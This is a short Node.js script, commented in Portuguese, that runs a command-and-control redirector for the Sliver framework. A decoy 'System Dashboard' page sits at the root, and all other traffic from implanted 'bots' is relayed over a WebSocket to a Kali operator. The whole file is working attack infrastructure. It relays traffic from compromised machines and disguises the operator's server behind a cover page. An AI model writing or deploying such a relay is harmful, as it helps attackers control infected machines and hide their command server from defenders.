const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 10000;
let KALI_WS = null;

const server = http.createServer((req, res) => {
    // 1. Simulação de Front-end (Evita que o Render derrube por ociosidade)
    if (req.url === '/' || req.url === '/index.html') {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end('<h1>System Dashboard</h1><p>Status: Monitoring Active.</p>');
        return;
    }

    // 2. Encaminhamento de Tráfego do Sliver (O Bot envia dados via POST/GET)
    let body = [];
    req.on('data', chunk => body.push(chunk));
    req.on('end', () => {
        const payload = Buffer.concat(body).toString('base64');
        
        if (KALI_WS && KALI_WS.readyState === WebSocket.OPEN) {
            KALI_WS.send(JSON.stringify({
                type: 'SLIVER_TRAFFIC',
                path: req.url,
                method: req.method,
                headers: req.headers,
                data: payload
            }));
            res.writeHead(200);
            res.end(); // Confirma recebimento para o Bot
        } else {
            res.writeHead(503);
            res.end("C2 Bridge Offline");
        }
    });
});

const wss = new WebSocket.Server({ server });
wss.on('connection', (ws, req) => {
    if (req.url.includes('id=KALI')) {
        KALI_WS = ws;
        console.log(`[${new Date().toLocaleTimeString()}] Operador KALI (Sliver) Conectado.`);
    }
});

server.listen(PORT, () => console.log(`Redirecionador Sliver Ativo na porta ${PORT}`));
